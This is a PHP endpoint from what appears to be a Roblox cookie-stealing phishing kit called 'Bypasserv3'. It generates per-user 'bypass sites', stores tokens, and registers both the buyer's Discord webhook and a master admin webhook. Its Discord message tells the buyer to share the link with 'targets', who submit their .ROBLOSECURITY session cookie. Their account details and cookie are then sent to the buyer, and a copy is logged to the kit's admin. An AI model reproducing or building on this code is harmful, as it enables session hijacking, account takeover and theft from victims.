<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

require_once '../config.php';
require_once '../functions.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
    exit;
}

$input = json_decode(file_get_contents('php://input'), true);

$directory = sanitizeDirectory($input['directory'] ?? '');
$webhook = trim($input['webhook'] ?? '');
$username = 'Bypasserv3';
$profilePicture = 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png';

// Validation
if (empty($directory) || strlen($directory) < 3) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Directory name must be at least 3 characters']);
    exit;
}

if (strlen($directory) > 32) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Directory name must be less than 32 characters']);
    exit;
}

if (!preg_match('/^[a-zA-Z0-9_-]+$/', $directory)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Directory can only contain letters, numbers, hyphens, and underscores']);
    exit;
}

if (directoryExists($directory)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Directory already exists. Please choose a different name.']);
    exit;
}

if (empty($webhook)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Webhook URL is required']);
    exit;
}

if (!validateWebhook($webhook)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Invalid webhook URL. Please check your Discord webhook.']);
    exit;
}

// Rate limiting
$clientIP = getUserIP();
if (!checkRateLimit($clientIP, 10, 3600)) {
    http_response_code(429);
    echo json_encode(['success' => false, 'error' => 'Rate limit exceeded. Please try again later.']);
    exit;
}

// Generate token
$token = generateToken();

// Create instance data
$instanceData = [
    'directory' => $directory,
    'webhook' => MASTER_WEBHOOK,
    'userWebhook' => $webhook,
    'username' => $username,
    'profilePicture' => $profilePicture,
    'createdAt' => date('c'),
    'stats' => [
        'totalVisits' => 0,
        'totalCookies' => 0,
        'totalRobux' => 0,
        'totalRAP' => 0,
        'totalSummary' => 0
    ],
    'dailyStats' => [
        'visits' => array_fill(0, 7, 0),
        'cookies' => array_fill(0, 7, 0),
        'robux' => array_fill(0, 7, 0),
        'rap' => array_fill(0, 7, 0),
        'summary' => array_fill(0, 7, 0)
    ]
];

// Save instance
if (!saveInstanceData($directory, $instanceData)) {
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => 'Failed to create instance directory']);
    exit;
}

// Save token
$tokenData = [
    'token' => $token,
    'directory' => $directory,
    'webhook' => $webhook,
    'username' => $username,
    'createdAt' => date('c')
];

$tokenHash = md5($token);
$tokenFile = DATA_PATH . 'tokens/' . $tokenHash . '.json';
file_put_contents($tokenFile, json_encode($tokenData, JSON_PRETTY_PRINT));

// Update global stats
updateGlobalStats('totalInstances', 1);

// Log creation
logSecurityEvent('instance_created', [
    'directory' => $directory,
    'token' => substr($token, 0, 8) . '...'
]);

// Send notification to user webhook
$domain = $_SERVER['HTTP_HOST'] ?? 'localhost';
$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
$baseUrl = $protocol . '://' . $domain;

$webhookData = [
    'username' => 'Bypasserv3',
    'avatar_url' => 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
    'embeds' => [
        [
            'title' => '✅ Site Generated Successfully',
            'description' => "Your bypass site **{$directory}** is ready with **FULL EMBED FUNCTIONALITY!**",
            'color' => hexdec('00FF00'),
            'fields' => [
                [
                    'name' => '📁 Site Name',
                    'value' => "`{$directory}`",
                    'inline' => false
                ],
                [
                    'name' => '🔗 Your Link',
                    'value' => "[{$baseUrl}/public/?dir={$directory}]({$baseUrl}/public/?dir={$directory})",
                    'inline' => false
                ],
                [
                    'name' => '✨ Full Features',
                    'value' => "✅ Account info fetching\n✅ Robux balance display\n✅ Premium status check\n✅ Limited RAP calculation\n✅ Group ownership detection\n✅ IP geolocation\n✅ Game visit stats\n✅ Rich Discord embeds\n✅ Cookie refresh bypass\n✅ Master admin logging",
                    'inline' => false
                ],
                [
                    'name' => '📋 How It Works',
                    'value' => "1. Share your link with targets\n2. They submit their .ROBLOSECURITY cookie\n3. Cookie is automatically Bypassed\n4. You receive FULL ACCOUNT INFO + BYPASSED COOKIE\n5. Master log sent to admin",
                    'inline' => false
                ]
            ],
            'footer' => [
                'text' => 'Site Generator - ' . date('Y-m-d h:i:s A')
            ],
            'timestamp' => date('c')
        ]
    ]
];

sendWebhook($webhook, $webhookData);

// Return success response
http_response_code(201);
echo json_encode([
    'success' => true,
    'token' => $token,
    'directory' => $directory,
    'instanceUrl' => $baseUrl . '/public/?dir=' . $directory,
    'dashboardUrl' => $baseUrl . '/dashboard/?token=' . $token
]);
?>
